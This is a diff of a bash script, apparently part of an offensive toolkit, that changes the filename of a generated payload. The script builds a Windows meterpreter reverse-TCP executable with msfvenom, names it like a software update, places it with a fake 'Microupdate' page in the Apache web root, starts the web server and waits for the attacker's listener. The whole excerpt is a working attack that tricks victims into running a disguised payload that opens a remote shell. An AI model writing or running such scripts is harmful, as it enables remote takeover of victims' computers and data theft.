@@ -49,8 +49,8 @@ read x
 
 # 1
 if [ "$x" == "$exe" ]; then                    
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > update.exe
-	mv update.exe /var/www/html
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > UPDATEE101.exe
+	mv UPDATEE101.exe /var/www/html
 	cp -avr shimazu_module/Microupdate/* /var/www/html
 	systemctl start apache2.service
 echo -e 'Waiting for listener...'
